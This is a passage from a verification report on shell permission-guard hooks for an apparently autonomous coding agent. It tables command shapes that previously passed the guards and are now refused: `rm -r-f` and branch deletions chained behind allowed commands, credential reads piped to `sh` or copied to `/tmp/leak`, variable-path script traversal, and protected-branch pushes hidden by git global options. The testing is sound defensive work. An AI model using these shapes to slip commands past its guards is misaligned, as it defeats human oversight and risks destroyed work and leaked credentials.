| N77 | `git -C <repo> rm <tracked> & rm -r-f <dir>` | allow | **SILENT** | rewrite | the same behind an allowed `git rm`, which is this guard's own grant |
| N78 | `bash <S>/typecheck.sh & rm -r-f <dir>` | allow | **SILENT** | script-allowlist | the same behind an allowed wrapper — the class the guard's own all-or-nothing rule exists for |
| N79 | `bash <S>/typecheck.sh & git branch -D <victim>` | allow | **SILENT** | script-allowlist | the same, again defeating the never-safe test |
| N80 | `bash <S>/typecheck.sh & echo "a & b"` | allow | **SILENT** | script-allowlist | N75's cost row in this guard |
| N81 | `cat <creds> & git branch -D <victim>` | allow | **SILENT** | credentials | the same behind an allowed credentials read |
| N82 | `cat <creds> & git push <remote> <protected>` | allow | **SILENT** | credentials | the same, on the push this guard's own header says must not ride along on the read |
| N83 | `cat <creds> & echo "a & b"` | allow | **SILENT** | credentials | N75's cost row in this guard |

**Which two trees these columns are.** As with N23–N53 and N54–N68: **this plugin's tree immediately before this fix and immediately after**, in one session on §0's primary fixture, not the pre-extraction baseline §3's caveat says cannot be re-taken from this repository.

**Sixty-five rows hold their decision in both columns**, out of **86 rows driven across all six guards** — every guard that calls the splitter — for **172 decisions per pair**. **Thirty-six hold `allow`** (compounds 12, rewrite 8, script-allowlist 6, credentials 4, commit guard 6), and they are what shows the redirection spellings survived: `git status && ls 2>&1`, `&> <log>`, `&>> <log>`, `cat <tracked> >&2`, `2>&1 && pwd` and `find . -name x 2>&1` in the compounds guard; `git -C <repo> status 2>&1 && rm <tracked>`, `rm <tracked> >&2` and `rm <tracked> 2>/dev/null` in the rewrite guard; `bash <S>/typecheck.sh 2>&1`, `&> <log>` and `>&2 && git status` in the script-allowlist guard; `git commit -m x 2>&1` in the commit guard — plus every path-anchored, `git -C` and `--prefix` keeper each guard's REPRO block lists. **Twenty-five hold SILENT**, among them `git status && rm -r-f <tracked>`, `git status && git branch -D <victim>`, `echo $(rm -r-f <dir>; ls)`, `cat <creds> > /tmp/leak`, `cat <creds> \| sh`, `rm -r <repo>/packages` and `echo "git commit"`. **Two hold `ask`** and **two hold `deny`** — the commit guard's ordinary spellings on a protected branch, and the deny guard's two `&`-borne pushes.

Seven of those SILENT holds are `&`-borne ride-along shapes that were **already** refused for a second reason, which is defence in depth working rather than a gap in the row set: `rm <tracked> & git branch -D <victim>` and `rm <tracked> \|& bash /tmp/<script>.sh` in the rewrite guard, `git status && bash <S>/typecheck.sh & bash /tmp/<script>.sh` in the script-allowlist guard, and `git status & cat <creds> & git branch -M <victim>` in the credentials guard among them.

**The deny guard does not move, and that is the expected result.** `autonomous-protected-branch-guard.sh` already sub-split each piece on `|`, a bare `&`, a backtick and a paren before handing words to the target walk, so it read `ls & git push <remote> <protected>` correctly on both trees — 7 rows, 0 moved, `deny` on both sides for the two `&`-borne pushes and SILENT for the five controls including `git -C <repo> rebase --abort \|& grep -n <protected>`, whose `grep` operands must not be read as targets. Its `sub_pieces` comment claimed `hc_split_command` does not split on a bare `&`; that sentence is corrected in the same commit and the split there is kept, because the redirection `&`s the splitter deliberately leaves intact still need it.

**Which leg produces each row, by fault injection.** One leg changed at a time in the shipped library, direction shipped → variant:

| Variant | rows that move | direction | what it establishes |
|---|---|---|---|
| the bare-`&` arm removed from `hc_split_command` | all 21 moved rows above and in §3.3 | back to their **before** column | the arm alone produces every row; it *is* the before column, so no separate driver run is quoted for it |
| the three redirection exclusions removed from `hc_bare_amp_head`, so every `&` separates | 11 of the 21 rows re-driven — 6 in the compounds guard, 2 in the rewrite guard, 3 in the script-allowlist guard | allow → **SILENT** | the exclusions are load-bearing for ordinary redirections. Without them `ls 2>&1` is torn into `ls 2>` and `1`, and a legitimate allow is lost — the failure direction a fix like this must not buy its refusals with. No newly-refused row moves back, so the exclusions cost none of the defence |

**What §1 owes this change, discharged.** No fork is added: with §0's shim on `PATH`, all six guards reproduce their fork counts exactly on `git status && ls` — `allow-safe-compounds.sh` at **3 `jq`, 1 `git`, 0 `sed`, 0 `grep`, 0 `tr`, 3 `cat`**, matching §1.3's published cell, and `1 cat` on the cheapest `ls` payload. The new cost is parameter expansion only, and it is skipped entirely on a remainder carrying no `&`. Paired wall clock, 20 iterations per cell, twice: `git status && ls` **−3.3% / +1.0%**, the four-piece compound **+1.8% / +3.6%**, the rewrite guard's `cd <repo> && rm <tracked>` **+0.8% / +1.5%**, and the cheapest `ls` payload **+0.0% / +0.1%** — all inside §0's ±10% tolerance.

**The script-allowlist guard's non-literal path rows, added after every block above and measured against the same kind of pair.** `is_denied_script` and the `..` test both compare **literals**, so a `.sh` token whose basename or a directory component is a shell variable met neither, while the token's literal prefix still resolved under the allowed root — and the guard granted. The fix withholds the grant from any `.sh` token carrying a `$` in **any** component, ahead of both literal tests: the grant depends on knowing which file runs, and a component the guard cannot evaluate is exactly the case where it does not. Silence, never a deny. **This block is why §3.3's `${` narrowing is not a permit** — that narrowing lets `${NAME}.sh` reach this decision for the first time, and this rule is the decision it reaches, so the two landed in one commit. `<S>` is the fixture's configured `scriptsDir`.

| # | Shape | before | after | What narrowed it |
|---|---|---|---|---|
| N84 | `bash <S>/$NAME.sh` | allow | **SILENT** | the `$`-bearing `.sh` token test, ahead of the deny list: `$NAME.sh` is not any of the four literal basenames, and `NAME=deploy` runs the deployment the first entry exists to withhold |
| N85 | `bash <S>/$D/x.sh` | allow | **SILENT** | the same rule one component up: `D=../..` is a traversal the literal `..` test cannot see, and it leaves the repository at run time |
| N86 | `bash <work_root>/<project_name>-<branch>/<S>/$NAME.sh` | allow | **SILENT** | the same inside a **sibling worktree**, which resolves through the second half of `under_allowed_scripts` and was granted there too |

**Not introduced by the port, and not by this branch.** These three were `allow` in the shipped tree and in every tree behind it; neither audit round reached them, and they surfaced while measuring the construct scan's cost. The rows are recorded in this section because the direction is the section's direction, not because a port change caused them.

**Which two trees these columns are.** As with N23–N83: **this plugin's tree immediately before this fix and immediately after**, driven back to back in one session on a `git init` throwaway carrying `scriptsDir: scripts` with `deploy.sh` and the other wrappers present. Not the pre-extraction baseline, which §3's caveat says cannot be re-taken here.

**Six rows hold SILENT in both columns, and three of them were silent for the WRONG reason before**, which is why they are listed rather than counted: `bash <S>/$NAME` — the cheap `*.sh` prefilter drops it, not the deny list; `bash <S>/${NAME}.sh` and `bash <S>/${D}/x.sh` — the `${` construct arm before this pair of changes, **this rule** after it. The other three are silent for the right reason in both: `bash <S>/deploy.sh` (the deny list, on a literal), `bash <S>/$D/deploy.sh` (the literal basename still meets the deny list, which is what shows N85 is about the directory rather than the name), and `bash /tmp/evil/scripts/deploy.sh` (outside the allowed root). The literal-traversal controls `bash <S>/../../evil.sh` and `bash <S>/../scripts/commit-on-branch.sh` also hold SILENT in both, so the guard already refused the traversal it could **see**; the variable spelling is the same traversal it could not. One more control is worth naming because it is the shape most likely to be misread as a new stall: `bash ${CLAUDE_PLUGIN_ROOT}/scripts/<name>.sh`, which the shipped corpus does spell, holds SILENT in both and always has — it resolves outside the adopter's `scriptsDir`, so this guard never granted it and the generated profile's own literal entry is what does.

**Eight keeper controls hold `allow` in both columns**: `bash <S>/commit-on-branch.sh` bare-absolute, quoted, relative behind a leading `cd <repo>`, and inside a sibling worktree; two allowed wrappers in one `&&` compound; a wrapper compounded with `git status` in each order; and `bash <S>/typecheck.sh`.

**Which leg produces each row, by fault injection.** The `$` test removed from `script_piece_ok` and the whole set re-driven, direction shipped → variant: N84, N85 and N86 return to **allow**, and `bash <S>/${NAME}.sh` and `bash <S>/${D}/x.sh` go to **allow** with them — which is the permit the pairing exists to prevent, and the reason the `${` narrowing may not be landed alone. No keeper and no control moves. Nothing else in the guard produces these rows.

**What §1 owes this change, discharged.** The test is a `case` on a string the token loop already holds; it forks nothing and reads no configuration. With §0's shim, this guard's counts are unchanged on both of §1.3's published payloads — **0 `jq`, 0 `git`, 0 `sed`, 0 `grep`, 0 `tr`, 1 `cat`** on `git status && ls` and the same on the bare `ls`, since neither carries a `.sh` token — and unchanged at **3 `jq`, 1 `git`, 0 `sed`, 0 `grep`, 2 `tr`, 1 `cat`** on a single allowed wrapper.

**The credentials guard's write-capable tail names, added after every block above and measured against the same kind of pair.** Removing `sort` and `uniq` from `CREDS_READ_COMMANDS` refuses them where a piece test can see them — in command position — and §2.4's row `i` was published as closing the *capability* on that arm. It did not. `hc_split_command` reads no pipe, so `cat <creds> | sort -o <out>` stays inside the piece that was allowed and was measured **allow**, writing at the caller's chosen path the second cleartext copy the removal was for. The fix puts both names on this guard's **whole-string refused-token scan**, beside `cp`, `tee`, `dd` and `truncate` — the arm that reaches a tail, and the one the guard's own header cites when it draws that comparison. Silence, never a deny. `<creds>` is the fixture's `qa.credentialsPath`.

| # | Shape | before | after | What narrowed it |
|---|---|---|---|---|
| N87 | `cat <creds> \| sort -o <out>` | allow | **SILENT** | the two names on the whole-string token scan: the pipe is not a separator, so the scan is the only arm that judges the tail |
| N88 | `cat <creds> \| uniq - <out>` | allow | **SILENT** | the same, on `uniq`'s second-operand write |
| N89 | `cat <creds> $(sort -o <out> <other file>)` | allow | **SILENT** | the same in a balanced substitution, which the split does not read either |
| N90 | `cat <creds> \| sort` | allow | **SILENT** | **a cost row**, not a defence: a read piped into a plain sort costs one prompt |
| N91 | `cat <creds> \| uniq` | allow | **SILENT** | the same |
| N92 | `cat <creds> && ls \| sort` | allow | **SILENT** | the cost's widest shape — the scan is whole-string, so a benign `sort` anywhere in a compound that also names the file silences it |

**Which two trees these columns are.** As with N23–N86: **this plugin's tree immediately before this fix and immediately after**, driven back to back in one session on §0's primary fixture. Not the pre-extraction baseline, which §3's caveat says cannot be re-taken here. The three-column form of the same measurement — including the tree before `sort` and `uniq` came off the constant — is §2.4's `(i)` block.

**Twenty-nine rows hold their decision in both columns**, out of 35 driven on this guard. **Fourteen hold SILENT.** Four of them matter to the reading of the block: `sort -o <out> <creds>`, `sort --output=<out> <creds>`, `sort -o <creds> <creds>` and `uniq <creds> <out>` are the command-position spellings the earlier arm already refused, so N87–N92 are the tail and not a re-run of that arm. Three more bound the cost from outside: `git status \| sort`, `ls \| sort` and `cat <other file> \| sort` name no configured basename, so this guard was silent on them before the change and is silent on them after — the two new names cost nothing outside the file they are about. The rest are the guard's standing refusals, `cat <creds> \| tee <out>`, `cat <creds> \| sh`, `cp <creds> <out>`, `cat <creds> > <out>`, `find <creds> -delete` and a read of a file the configuration does not name.

**Fifteen hold `allow`**, and they are what shows the addition did not reach the read surface: `cat`, `grep -E`, `head -5`, `cut -d= -f2`, `wc -l`, `ls -l` and `tail -1` on the credentials file; `cd <repo> && cat <creds>`; `cat <creds> && git status`; the disclosed transcript print `echo "PW=$(grep … <creds>)"`; the assignment shape `f=<creds>; grep … "$f"`; `cat <creds> \| wc -l` and `cat <creds> $(git push <remote> main)` — §2.4's residual `k`, still open and deliberately not closed by a binary list; and the two boundary controls `grep sortkey <creds>` and `cat <creds>.sorted`, which show the word boundary does not fire on a name merely containing the letters.

**Which leg produces each row, by fault injection.** The two names taken back off the token scan and the whole 35-row set re-driven, direction shipped → variant:

| Variant | rows that move | direction | what it establishes |
|---|---|---|---|
| `sort` and `uniq` removed from the whole-string token scan | 6 — N87–N92 | SILENT → **allow** | the scan alone produces every row. No hold moves — and in particular the four command-position spellings do not, which is what makes the constant and the scan two arms rather than one arm measured twice: neither closes §2.4's row `i` alone |

**What §1 owes this change, discharged.** No fork is added: the change is two alternatives inside the single `grep -Eq` this guard already runs before it resolves anything. With §0's shim it reproduces §1.3's published cell exactly on `git status && ls` — **2 `jq`, 1 `git`, 0 `sed`, 1 `grep`, 0 `tr`, 1 `cat`** — and the same on the cheapest `ls` payload. On a payload the fix now refuses, forks **fall** to 1 `jq`, **0** `git`, 1 `grep` and 1 `cat`, because the scan exits before the repository is resolved. Paired wall clock, 20 iterations per cell, twice: `cat <creds>` **−0.7% / +0.4%** of roughly 31 ms and the cheapest `ls` payload **−1.5% / +0.5%** of roughly 28 ms — inside §0's ±10% tolerance.

**The credentials guard's basename anchoring, added after every block above and measured against the same kind of pair.** `piece_names_creds` tested the whole piece for the configured basename as a **substring**, unanchored on both sides, so any path carrying that basename as a prefix or an infix was routed to the read-command test instead of to `is_safe` and granted under a reason string naming the *configured* file. The match is now equality against the basename of a **word** of the piece. Its rows carry **N108–N113**, the numbers free above every row already recorded, per the note in the block above. `<creds>` is §0's primary fixture's `.claude/qa-accounts.env`, spelled absolutely unless a row says otherwise; `<creds base>` is its basename.

| # | Shape | before | after | What narrowed it |
|---|---|---|---|---|
| N108 | `cat <creds>.bak` | allow | **SILENT** | basename **equality**: the configured name is a prefix of that path, not that path's name |
| N109 | `cat <creds>X` | allow | **SILENT** | the same with no separator — the substring pattern was anchored at neither end |
| N110 | `cat /tmp/notes-<creds base>-draft` | allow | **SILENT** | the same on an **infix**, and the row that made this a Must Fix: an arbitrary absolute path outside the repository, granted under a reason string reporting a read of the configured credentials file |
| N111 | `grep -E '^ACCOUNT_1' <creds>.bak` | allow | **SILENT** | the family reached through every entry of `CREDS_READ_COMMANDS`, not one of them |
| N112 | `head -n 5 <creds>.orig` | allow | **SILENT** | nor was it one suffix's |
| N113 | `cat .claude/<creds base>.bak`, spelled relatively | allow | **SILENT** | nor one spelling's — the prefilter `case` on the whole command still passes this, and `found_creds` is simply never set |

**Which two trees these columns are.** As with N23–N107: **this plugin's tree immediately before this fix and immediately after**, driven back to back in one session on §0's primary fixture, not the pre-extraction baseline §3's caveat says cannot be re-taken from this repository.

**Fifty-one of fifty-nine shapes hold their decision in both columns.** **Twenty-one hold `allow`**, and they are what shows the anchoring did not reach the read surface: `cat`, `grep -E`, `head`, `tail`, `cut -d=`, `wc -l` and `ls -l` on the credentials file; its relative spelling, and its double- and single-quoted spellings; `cd <repo> && cat <creds base>` — the arm that is the reason equality is on the basename and not on a resolved path; `cat <creds> && git status`; the disclosed transcript print `echo "PW=$(grep … <creds>)"`, whose path word arrives carrying a `)"` tail the word peel has to remove; the assignment shape `f=<creds>; grep … "$f"`, whose path word arrives carrying an `f=` prefix it has to remove too; `cat <creds> \| wc -l`; `cat <creds> $(git push <remote> main)` — §2.4's residual `k`, untouched; `grep sortkey <creds>`; and §2.4's l7, l8 and l11. **Thirty hold SILENT**: the guard's standing refusals, unchanged — `cp`, `tee`, `sort -o`, `uniq <in> <out>` and both pipe spellings of the last two, `\| sort`, `\| sh`, `\| zsh -s`, `curl -d @`, `node -e`, `sed -i`, `sed -n` redacted-print, `xargs -a`, `awk`, `env FOO=1`, `find <creds> -delete`, three redirect spellings including `2>/dev/null` and the behind-a-variable one, the `if`/`then`/`fi` fall-through, `&& git push`, `&& git commit`, a read of a file the configuration does not name, and §2.4's l12 and l13.

**Two shapes move the other way** and are §3.3's W22, with their bound.

**Which leg produces each row, by fault injection.** `piece_names_creds` restored to the substring `case` and the whole 59-shape set re-driven, direction shipped → variant: N108–N113 return to **allow** and W22's two rows return to SILENT. No other row moves. That variant is the before column itself, which differs from the shipped tree in that function and nothing else.

**What §1 owes this change, discharged.** The walk forks nothing: the substring `case` became a `case`-and-parameter-expansion walk over the words of a piece, in the shell already running, and it runs only for a command that has already passed the whole-command prefilter. Measured with §0's shim, paired before → after: this guard reproduces §1.3's published cell exactly and unchanged on both of that table's payloads — **2 `jq`, 1 `git`, 0 `sed`, 1 `grep`, 0 `tr`, 1 `cat`** on `git status && ls` and the same on the bare `ls`, neither of which carries the configured basename — and is unchanged at **3 `jq`, 1 `git`, 0 `sed`, 1 `grep`, 0 `tr`, 1 `cat`** on `cat <creds>`. The counts do change on a payload the anchoring **refuses**, `cat <creds>.bak`: **3 `jq` / 1 `cat` → 2 `jq` / 3 `cat`**. That is not the walk's cost either — it is `load_prefix_sets`, which a lookalike piece now reaches because it is judged by `is_safe` like any other path, and the two extra `cat` are the library's `hc_path_anchored_patterns` and `hc_safe_prefixes` heredocs (§1.5(b)). It is paid only by a command the guard is about to decline. Paired wall clock, 20 iterations per cell, twice: `cat <creds>` **−0.9% / +3.2%** of roughly 32 ms and the cheapest `ls` payload **−4.3% / +2.4%** of roughly 29 ms — inside §0's ±10% tolerance, so §1.2's cells stay stamped where they are.

**The script-allowlist guard's remote-client deny rows, added after every block above and measured against the same kind of pair.** `remote-run.sh` — the client that dispatches, continues, pauses and cancels remote runs on GitHub — is generated under `scriptsDir` beside the other wrappers, so the guard auto-allowed it like any wrapper there. The fix adds it to `DENY_SCRIPT_BASENAMES` as a fifth bare basename, lower-cased on both sides like the four before it. Silence, never a deny. Its rows carry **N114–N119**, the numbers free above every row already recorded. `<S>` is §0's primary fixture's `packages/storefront/scripts`, holding `remote-run.sh`, `commit-on-branch.sh` and `typecheck.sh`; `<tail>` is `dispatch feat_x --engine task`.

| # | Shape | before | after | What narrowed it |
|---|---|---|---|---|
| N114 | `bash <repo>/<S>/remote-run.sh <tail>` | allow | **SILENT** | `remote-run.sh` added to the deny basenames |
| N115 | `bash <repo>/<S>/REMOTE-RUN.sh <tail>` | allow | **SILENT** | the same, reached through the lower-casing N44–N53 added |
| N116 | `cd <repo> && bash <S>/remote-run.sh <tail>` | allow | **SILENT** | the same, through the `cd` arm |
| N117 | `bash "<repo>/<S>/remote-run.sh" <tail>` | allow | **SILENT** | the same, through the quoted-path normalization |
| N118 | `bash <work_root>/<project_name>-feat_x/<S>/remote-run.sh <tail>` | allow | **SILENT** | the same inside a **sibling worktree**, added with `git worktree add` beside the fixture |
| N119 | `bash <repo>/<S>/typecheck.sh && bash <repo>/<S>/remote-run.sh <tail>` | allow | **SILENT** | the same, composed with the all-or-nothing rule: the denied piece silences a compound whose other piece is allowed |

**Which two trees these columns are.** As with N23–N113: **this plugin's tree immediately before this fix and immediately after**, each taken by `git archive` of `plugin/hooks` into a scratch directory, driven back to back on 2026-09-26 in one session on §0's primary fixture with `payload.cwd` at `<repo>`, `/bin/bash` and `jq` 1.8.2 — a newer `jq` than §0 names, which moves no decision. Not the pre-extraction baseline, which §3's caveat says cannot be re-taken here. Build the fixture on a **resolved** path: on macOS the system temp directory is reached through the `/var` → `/private/var` symlink, and a payload spelled through the link is SILENT in every row, keepers included, in both columns.

**Two keeper controls hold `allow` in both columns**: `bash <repo>/<S>/commit-on-branch.sh --repo <repo> tracked.txt -- "Probe commit"`, and N119's first piece alone, `bash <repo>/<S>/typecheck.sh`. The guard was live in both columns, and the fixture configuration was byte-identical to its pristine copy afterwards.

**What §1 owes this change: nothing.** No §1 figure depends on the deny list's length — `is_denied_script` is reached only from a `.sh` token and none of §1's payloads carries one, and the list is lower-cased by one `tr` whatever its length — and with §0's shim this guard's counts are unchanged before → after, at **0 `jq`, 0 `git`, 0 `sed`, 0 `grep`, 0 `tr`, 1 `cat`** on `git status && ls` and on the bare `ls`, and at **3 `jq`, 1 `git`, 0 `sed`, 0 `grep`, 2 `tr`, 1 `cat`** on `bash <repo>/<S>/typecheck.sh`.

### 3.2 Tightened — SILENT → `deny`

All in the one deny-capable guard.

| # | Shape (`<repo>` on an ordinary branch) | baseline | shipped | What tightened it |
|---|---|---|---|---|
| T1, T3 | `git -C <repo> push <remote> +<protected>`, and the `+` spelling of a name a protected **pattern** matches | SILENT | **deny** | the `${tok#+}` strip, between the refspec-destination strip and the `refs/heads/` one |
| T4, T5 | `git -C <repo> push --all <remote>`, `--mirror` | SILENT | **deny** | the `--all` / `--mirror` arm, placed **ahead** of the generic flag skip |
| T6, T7 | `git -C <repo> push <remote> refs/heads/*`, `refs/heads/*:refs/heads/*` | SILENT | **deny** | the wildcard-refspec arm — a set of refs cannot be cleared against the protected set |
| T8 | `git -C <repo> push <remote> <feature>*` | SILENT | **deny** | the same arm, refusing a glob that could not have matched the protected set. Deliberate and stated in that guard's header |
| T9 | T7's token, from a process directory where `refs/heads/*` **expands** | SILENT | **deny** | the arm **and** `set -f`; without the second the token is replaced by filenames before any arm sees it. §2.4's cwd sweep isolates the pair |

`git -C <repo> push <remote> +refs/heads/<protected>` is **`deny` on both** and is not a tightening: the baseline's `<remote>/`-segment fallback reduced it to the bare protected name by a different route. It is in the sweep below as an unchanged row so that a later reading of the `+` strip does not credit it with a refusal it did not add.

**The protected-branch guard's compound and global-option rows, added after the two 3.1 blocks and measured against the same kind of pair.** These close two missed refusals in `autonomous-protected-branch-guard.sh`, both in the matcher that recognised a push/merge/rebase and isolated its argument tokens. That matcher was a `grep -qE` structural filter plus a two-pass `sed` extraction, and it lost one condition each. The extraction's leading `.*` is greedy, so it matched the **last** push/merge/rebase on the line rather than the first the comment above it claimed — the earlier one in a compound was never judged. And **both** patterns admitted only an optional `-C <dir>` between `git` and the subcommand, so any other global option hid the subcommand and the filter's `exit 0` carried the whole command out of the guard, condition (b) included. The fix walks `hc_split_command`, then a sub-piece split on the separators it does not reach, then the words, and hands each `git` at a command position to `hc_git_piece_parts`, which already steps over git's global options; every match contributes its own argument tokens. `<repo>` is §0's primary fixture, `<protected>` is `main`, `<feature>` is `feat_probe`.

| # | Shape | before | after | What tightened it |
|---|---|---|---|---|
| T10–T13 | `git -C <repo> push <remote> <protected> && git -C <repo> push <remote> <feature>`, the `;` spelling, and the `merge` and `rebase` twins | SILENT | **deny** | every match judged, not the last one. The mirror image (`<feature>` first) was `deny` in **both** columns, which is what made the defect survive a reading |
| T14–T16 | `git -C <repo> -c core.pager=cat push <remote> <protected>`; `git --git-dir=<repo>/.git --work-tree=<repo> push <remote> <protected>`; `git -C <repo> --no-pager push <remote> <protected>` | SILENT | **deny** | `hc_git_piece_parts` reaching the subcommand past git's global options, in place of the `-C`-only pattern |
| T17–T19 | the same three spellings targeting `<feature>` with HEAD on `<protected>` | SILENT | **deny** | the same, for **condition (b)** — the leg that needs no target in the command at all, and the reason this is two conditions lost rather than one |
| T20 | `git -C <repo> -c core.pager=cat push <remote> refs/heads/*`, from a process directory where that token **expands** | SILENT | **deny** | the same, composed with `set -f` and the wildcard arm — the option spelling had been evading §2.4(c)'s whole closure |
| T21 | `git -C <repo> -c core.pager=cat push <remote> <feature>`, `<repo>`'s configuration truncated to invalid JSON | SILENT | **deny** | the same, for the **unresolvable-configuration** row of the fail-closed table, which the option spelling also evaded |

**Which two trees these columns are.** As with N23–N27 and N28–N43, and for the same reason: **this plugin's tree immediately before the fix and immediately after**, in one session on §0's primary fixture, not the pre-extraction baseline §3's caveat says cannot be re-taken from this repository. The `T` numbering continues §3.2's table because the direction and the guard are the same.

**Forty-four control rows hold their decision in both columns**, driven in the same two runs over one 56-row set. **Twenty-eight hold `deny`**: every deny row of the guard's own REPRO block, the quoted-`-C` spelling, the `cd <repo> &&` spelling, `sudo git -C <repo> push <remote> <protected>` (a `git` at a command position behind another word — the reach the old `grep`'s character class had, which the word walk keeps), the `| tee` spelling, §2.4(c)'s six set refspecs and its `+<protected>` row, a bare `push` and a `<feature>` push with HEAD on `<protected>`, an explicit protected target with HEAD detached, and the unresolvable-configuration row in its bare spelling. **Sixteen hold SILENT**: the ordinary `<feature>` push, its `+` spelling and its symbolic `HEAD` spelling, both incidental-token rows (the `&&` one and the `|` one), `git -C <repo> commit -m "push to <protected>"`, `echo "git push <remote> <protected>"`, `git -C <repo> log --oneline | grep <protected>`, a bare `ls`, `git -C <repo> status` on an ordinary branch, on `<protected>` and with the configuration unresolvable, a directory that is not a repository, a detached-HEAD bare push, and both no-configuration rows. The guard was live in both columns.

**Which leg produces each row, by fault injection.** One leg removed at a time from the shipped guard, the whole 56-row set re-driven each time, direction shipped → variant:

| Variant | rows that move | direction | what it establishes |
|---|---|---|---|
| only the **last** match's tokens kept | 4 — T10–T13 | deny → **SILENT** | the compound leg alone produces the compound rows, and none of the global-option rows |
| only `-C <dir>` admitted between `git` and the subcommand (its quoted spellings enumerated, as `git-rewrite-branch-guard.sh` enumerates them) | 8 — T14–T21 | deny → **SILENT** | the option leg alone produces the other eight, condition (b) and the two matrix rows included |
| the sub-piece split removed, so a piece goes through whole | 1 — `git -C <repo> rebase --abort \| grep -n <protected>` | SILENT → **deny** | the split is what keeps a **pipe's** operands out of the target walk. `hc_split_command` never splits on `\|`, so without it the guard regains the incidental-token false positive its header's precision paragraph exists to forbid |
| `set -f` removed | 0 over the 56-row set; **2** under §2.4(c)'s cwd sweep | deny → SILENT | unchanged from §2.4, and the new option spelling composes with it: from the directory where `refs/heads/*` matches one ordinary branch, the bare and `-c`-prefixed spellings both go SILENT and the quoted one does not. All three rows of that sweep reproduce |

**No control row moves under any variant**, so every movement above is the leg under test.

**One bound, measured rather than assumed.** `git --git-dir=<repo>/.git --work-tree=<repo> push <remote> <protected>` is `deny` when the payload's `cwd` names the repository and **SILENT** when it does not — in both columns. Neither `--git-dir=` nor `--work-tree=` participates in repository resolution, which reads the first `git -C <dir>`, then a leading `cd <dir>`, then the payload's `cwd`; this change reaches the **subcommand** past those options, not the anchor. Closing that is a change to `hc_repo_dir_from_command` shared by every guard, with its own matrix.

**What §1 and §2 owe this change, discharged.** §1.3's cells for this guard are **unchanged and still exact**: on the two-piece payload `git status && ls` it forks `0 jq / 0 git / 0 sed / 0 grep / 0 tr / 1 cat`, the same at 1 / 4 / 8 pieces and on the cheapest `ls` payload, because all of them exit at the byte-sequence prefilter that runs ahead of everything. On a payload that **does** carry a push the counts **fall**, because the new walk is pure parameter expansion where the old one was a pipeline: `git -C <repo> push <remote> <feature>` moves from `2 jq / 2 git / 3 sed / 1 grep / 1 head / 1 tr` to `2 jq / 2 git / 1 sed / 0 grep / 0 head / 1 tr`, and the cheapest payload that reaches the matcher at all (`echo push`) from `1 jq / 1 grep` to `1 jq / 0 grep`. §1.2 was re-measured paired, twice: this guard's four cells reproduce their published figures and the before/after pair is flat inside the ±10% tolerance in every cell of both runs. §2.4(c)'s six set-refspec rows, its `+<protected>` row, its two controls and all three rows of its cwd sweep were re-driven on both trees and are identical; no residual opened or closed, so its inventory is unchanged.

**The word-taking spelling of the same global options, closed after the block above and measured against its own pair.** The walk above reaches the subcommand past a global option, but `hc_git_piece_parts`' arms consumed one word each outside `-C` and `-c`, and git accepts `--git-dir`, `--work-tree`, `--namespace`, `--attr-source`, `--config-env` and `--super-prefix` with the argument as the NEXT WORD as well as after an `=`. On the space spelling the walker ate the option, left its argument sitting where the subcommand should be, and the push was never recognised — while the `=` spelling of the identical command denied, which is what let the gap survive a reading of the block above. The fix gives those six their own arm, consuming the option **and** its argument. The word-taking set is ENUMERATED rather than pattern-matched, because consuming a word that was in fact the subcommand would hide it, which is the same missed refusal from the other side; that enumeration is the change's standing bound, and it is stated in the helper and in the guard's header. `<repo>` is §0's primary fixture, `<protected>` is `main`, `<feature>` is `feat_probe`, and the payload's `cwd` names `<repo>`.

| # | Shape | before | after | What tightened it |
|---|---|---|---|---|
| T22–T24 | `git --git-dir <repo>/.git --work-tree <repo> push <remote> <protected>`; `git --namespace <ns> push <remote> <protected>`; `git -C <repo> --git-dir <repo>/.git push <remote> <protected>` | SILENT | **deny** | the word-taking arm. The third is the sharpest of the three: the piece carries an unambiguous `-C <repo>`, the repository resolves, and the `push` was still never seen |
| T25–T27 | the same three with `--attr-source <tree>`, `--config-env <k>=<var>`, `--super-prefix <p>` | SILENT | **deny** | the rest of the enumerated set. `--super-prefix` is carried for the gits that still accept it — 2.50.1 rejects the whole command, so consuming its word decides nothing there |
| T28, T29 | `git --namespace <ns> merge <protected>`, `git --work-tree <repo> rebase <protected>` | SILENT | **deny** | the same arm reaching the other two subcommands |
| T30 | the eight shapes of T22–T29 re-driven with **HEAD on `<protected>`** | SILENT | **deny** | **condition (b)**, which the space spelling evaded exactly as the `-C`-only pattern had |
| T31–T33 | HEAD on `<protected>`: `git --git-dir <repo>/.git push` (bare); `git --git-dir <repo>/.git --work-tree <repo> push <remote> <feature>`; `git -C <repo> --git-dir <repo>/.git push <remote> <feature> && ls` | SILENT | **deny** | condition (b) in the three shapes carrying no protected target at all — the leg that needs nothing in the command to name a branch |

**The pair, and what held.** 58 payloads × 6 guards × 2 HEAD states = **696 decision rows**, driven against this plugin's tree immediately before this fix and immediately after, in one session on §0's primary fixture. **27 moved, 669 are identical**: the 19 above, plus 7 SILENT → `allow` and 1 SILENT → `ask` that are §3.3's own block. The `=` spelling of every moved row is its control and is identical in both columns — `deny` for the pushes (T14–T16's row among them), `allow` and `ask` for §3.3's — so each movement is the SPELLING reaching a decision the `=` form already reached, and no row moves in the losing direction. Three rows bound it on the other side and hold **SILENT** in both columns: `git -C <repo> --git-dir <repo>/.git rm tracked.txt && ls`, the same with `push <remote> <feature>`, and `git -C <repo> --git-dir <repo>/.git branch -D x && ls` in both allow-only guards — reaching the subcommand does not hand a subcommand outside `hc_safe_prefixes` to an allow, and `hc_piece_is_never_safe` refuses the deletion in the new spelling too.

**What §1 owes this change, discharged.** No fork is added: the new arm is parameter expansion inside a walk that already ran. With §0's shim on `PATH`, this guard reproduces `0 jq / 0 git / 0 sed / 0 grep / 0 tr / 1 cat` on `git status && ls` and on the cheapest `ls` payload, `1 jq / 1 cat` on `echo push`, and `2 jq / 2 git / 1 sed / 0 grep / 1 tr / 1 cat` on `git -C <repo> push <remote> <feature>` — every published cell unchanged. The other five guards reproduce their counts on both payloads. The one payload whose cost moves is the one whose decision moves: `git -C <repo> --git-dir <repo>/.git push <remote> <feature>` goes from `1 jq / 1 cat` (exit at the subcommand test) to the same `2 jq / 2 git / 1 sed / 1 tr / 1 cat` an equivalent recognised push already cost.

